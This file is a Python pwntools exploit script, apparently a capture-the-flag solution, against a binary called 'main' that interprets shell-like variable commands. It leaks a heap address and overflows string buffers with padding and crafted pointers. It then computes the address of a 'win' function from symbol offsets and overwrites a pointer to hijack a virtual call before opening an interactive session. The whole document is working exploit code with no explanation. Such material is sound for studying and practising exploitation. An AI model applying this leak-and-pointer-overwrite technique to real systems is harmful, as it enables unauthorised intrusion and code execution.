import argparse
import pwn

parser = argparse.ArgumentParser()

parser.add_argument('-r', action='store_true', help="Run script against a remote server")
parser.add_argument('-i', '--ip', type=str, help="IP address of remote server", default=None)
parser.add_argument('-p', '--port', type=int, help="Port of remote server", default=None)

args = parser.parse_args()

file = "./main"

if args.r:
    conn = pwn.remote(args.ip, args.port)
else:
    conn = pwn.process(file)

elf = pwn.ELF(file)

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$z=0\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'log\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$var=str\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'X'*29+b'\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'log\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$(($var+$z))\n')

r = conn.recvuntil(b'> ')
print(r)

str_addr = int(r.split(b'\n')[0])
long_var_ptr = str_addr - 176

conn.send(b'log\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$vor=sto\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'X'*37 + bytes(reversed(bytes.fromhex(hex(long_var_ptr)[2:]))) + b'\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'log\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$(($vor+$z))\n')

r = conn.recvuntil(b'> ')
print(r)

long_var_addr = int(bytes(reversed(r.split(b': ')[1].split(b'\n')[0])).hex(), 16)
offset_win = elf.symbols['_ZTV12longVariable'] - elf.symbols['_Z3winv'] + 16
win_addr = long_var_addr - offset_win

conn.send(b'log\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$win=' + str(win_addr).encode() + b'\n')

win_addr_ptr = str_addr - 0x40 + 0x1D0

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'log\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$pwn=str\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'X'*21 + bytes(reversed(bytes.fromhex(hex(win_addr_ptr)[2:]))) + b'\n')

r = conn.recvuntil(b'> ')
print(r)
conn.send(b'$pwn\n')

conn.interactive()
